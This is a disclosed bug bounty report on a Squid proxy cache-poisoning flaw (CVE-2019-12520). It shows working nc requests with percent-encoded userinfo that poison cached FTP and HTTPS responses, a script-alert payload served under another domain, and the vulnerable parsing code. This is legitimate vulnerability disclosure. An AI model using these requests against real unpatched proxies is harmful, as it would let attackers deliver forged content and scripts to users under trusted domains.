# Cache Poisoning

## Report Details
- **Report ID**: 824753
- **URL**: https://hackerone.com/reports/824753
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-03-19T16:44:08.040Z
- **Disclosed**: 2021-08-26T23:26:46.049Z

## Reporter
- **Username**: jeriko_one
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## Summary:
An attacker can cause Squid to return to the user attacker controlled data, for any domain. From Squid-4.7 and below both HTTPS and FTP could be poisoned. This is due to Squid URL decoding parts of the Request URL and using that to create a hash. Request that decode to the same URL will retrieve the same cached response even if they're from different domains. 

The fix for  CVE-2019-12524 removed the HTTPS aspect of it, but FTP poisoning was still possible till Squid-4.10. 

<= Squid-4.9 Vulnerable
<= Squid-4.7 Can also poison HTTPS was reduced to just FTP 

Assigned CVE-2019-12520
No Announce was officially made by Squid, and was silently fixed with Squid-4.10. This was going to be announced with http://www.squid-cache.org/Advisories/SQUID-2019_4.txt, but never got published when I demonstrated their patch was incomplete at the time.

Fixed in Squid-4.10
## Steps To Reproduce:
### Poisoning FTP Cache in Squid-4.9
1) Start Squid
2) Start a FTP Server I attached a python script for this
```
ftp_server.py 8080 8081
```
3) Make the Request to poison the cache
```
echo -e "GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128
nc: using stream socket
HTTP/1.1 200 Gatewaying
Server: squid/4.9
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 15:57:04 GMT
Content-Type: text/plain
Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT
Age: 79
X-Cache: HIT from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.9)
Connection: keep-alive

23
Hello! This is from my ftp server.

0
```

The FTP server should have output similar to 
```
<- 150 Here comes data
Passive Connection from: ('192.168.122.97', 51647)
<- Hello! This is from my ftp server.
<- 226 Data sent
-> QUIT
```

4) Now make the request to the actual domain
Notice the X-Cache: HIT header
```
echo -e "GET ftp://hackerone.com/?@192.168.122.1:8080/payload HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

nc: using stream socket
HTTP/1.1 200 Gatewaying
Server: squid/4.9
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 15:57:04 GMT
Content-Type: text/plain
Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT
Age: 249
X-Cache: HIT from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.9)
Connection: keep-alive

23
Hello! This is from my ftp server.

0

```

You will get the output from the cached response instead of the real response from hackerone.com or whichever domain you're poisoning 

### Poisoning HTTPS Cache in Squid-4.7
To repro the HTTPS poisoning you need to configure Squid to cache SSL request. This involves generating a root cert, and inserting some config options. https://wiki.squid-cache.org/Features/DynamicSslCert Has steps on how to achieve this. Below is what I added to my config. You will need to change the prefixes to match your system. 

Replace the existing http_port 3128 entry with the following:
```
http_port 3128 ssl-bump \
       generate-host-certificates=on dynamic_cert_mem_cache_size=4MB \
       cert=/home/j1/h4x/squid/certs/myCA.pem
sslcrtd_program /home/j1/h4x/squid/ship/squid-4.7/libexec/security_file_certgen -s /home/j1/h4x/squid/ship/squid-4.7/var/lib/ssl_db -M 4MB
```

If your test certs aren't valid (self signed for testing) you need to add the following directive in the config. 
```
sslproxy_cert_error allow all
```

Finally you'll need to initalize the SSL DB that you've told Squid to use. This is the -s option in sslcrtd_program

```
./libexec/security_file_certgen ./var/lib/ssl_db -c -s ./var/lib/ssl_db -M 4MB
```

You're also going to need a server with SSL that you can control the headers on.
You have to send the following header so that Squid will cache your response. 
```
Cache-Control: public, immutable, max-age=31536000
```
Once you've done that you're ready to repo HTTPS poisoning which is essentially the same as our FTP Poisoning. 

1) Start Squid
```
./sbin/squid
```

2) start you SSL Server 

3) Make a poison request
```
echo -e "GET https://hackerone.com%2f%3f@192.168.122.1:8080/html/alert.html HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

nc: using stream socket
HTTP/1.1 200 OK
Server: SimpleHTTP/0.6 Python/3.6.10
Date: Thu, 19 Mar 2020 16:17:46 GMT
Content-Type: text/html
Content-Length: 74
Last-Modified: Mon, 22 Apr 2019 23:18:08 GMT
Cache-Control: public, immutable, max-age=31536000
X-Cache: MISS from g64
Via: 1.1 g64 (squid/4.7)
Connection: keep-alive

<html>
	<body>
		<script>alert(document.domain)</script>
	</body>
</html>
```
4) Make the request to the real domain 
Notice the X-Cache: HIT header
```
echo -e "GET https://hackerone.com/?@192.168.122.1:8080/html/alert.html HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128
nc: using stream socket
HTTP/1.1 200 OK
Server: SimpleHTTP/0.6 Python/3.6.10
Date: Thu, 19 Mar 2020 16:17:46 GMT
Content-Type: text/html
Content-Length: 74
Last-Modified: Mon, 22 Apr 2019 23:18:08 GMT
Cache-Control: public, immutable, max-age=31536000
Age: 334
X-Cache: HIT from g64
Via: 1.1 g64 (squid/4.7)
Connection: keep-alive

<html>
	<body>
		<script>alert(document.domain)</script>
	</body>
</html>
```

## Analysis

When making a request Squid will check its cache to see if it has a response
that it can serve up. When squid determines that a reply can be cached it uses
a combination of METHOD, absolute URL, and possible vary headers to form a
MD5 hash.

This takes place in storeKeyPUblicByRequestMethod
```
    SquidMD5Update(&M, &m, sizeof(m));
    SquidMD5Update(&M, (unsigned char *) url.rawContent(), url.length());
```

Similar to the ACL Bypass vuln I reported earlier this abuses that the userInfo is decoded and is stored as part of the url. So when url is used to update the hash it's using a decoded string 

```
effectiveRequestUri() will return url.absolute() for methods that aren't
CONNECT and schemes that aren't PROTO_AUTHORITY_FORM

 Looking at Uri::absolute we see that the userInfo is included into the
 absolute uri representation if the protocol is HTTPS

             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||
                                      getScheme() != AnyP::PROTO_HTTPS ||
                                      userInfo().isEmpty();
            if (!omitUserInfo) {
                absolute_.append(userInfo());
                absolute_.append("@", 1);
            }

userInfo is set in Uri::parse if the foundHost contains a @ that
the userinfo is extracted and then decoded.

        t = strrchr(foundHost, '@');
        if (t != NULL) {
            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);
            login[sizeof(login)-1] = '\0';
            t = strrchr(login, '@');
            *t = 0;
            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);
            foundHost[sizeof(foundHost)-1] = '\0';
            // Bug 4498: URL-unescape the login info after extraction
            rfc1738_unescape(login);
        }
```
This is eventually stored in userInfo when calling parseFinish
 parseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);

This userInfo is the decoded version, therefore special tokens such as ? # /
are possible entries in the userInfo. 

It's possible to have a cache entry for one domain, be used for another
domain. Leading to possible HTML/JS execution in a target domain. The
requirement being that it must have the HTTPS protocol.

This can lead to Squid serving the wrong
Reply as multiple request from different domains can look similar.

Take for example the following:
https://squid-cache.org%2F%3F@192.168.1.23:8080/

The reply from 192.168.1.23 would decode to
https://squid-cache.org/?@192.168.1.23:8080/
And the reply would be stored

Now if a real request for squid-cache.org came in with a similar URL
https://squid-cache.org?@192.168.1.23:8080/
The cached reply would be served, and any scripts that were returned by
the original request would now be running in squid-cache.org context.

## Impact

Attacker can poison the Cache causing users to receive attacker controlled data when going to a trusted domain. 
Squid-4.9 And below allows an attacker to poison FTP responses, a user could download attacker controlled data thinking it came from a legitiment source. 

<= Squid-4.7 Can also poison HTTPS allowing attacker controlled content to run in another domain. 

These both require a user to visit a specially crafted URL.

## Attachments
- ftp_server.py
